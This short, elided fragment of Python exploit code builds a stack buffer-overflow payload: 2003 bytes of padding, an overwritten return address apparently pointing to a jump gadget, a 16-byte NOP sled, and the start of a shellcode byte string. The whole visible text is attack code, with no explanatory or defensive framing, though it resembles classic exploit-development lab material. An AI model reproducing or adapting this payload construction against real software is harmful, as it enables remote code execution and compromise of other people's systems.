...
#2003 buffer + 4 EIP + 16 NOP sled + shellcode
...
shellcode = (b"\xd9\xe1\xbe\x77\xa9\xa4\xfa\xd9\x74\x24\xf4\x5b\x29\xc9"
...
payload = b"A" * 2003 + b"\x05\x12\x50\x62" + b"\x90" * 16 + shellcode
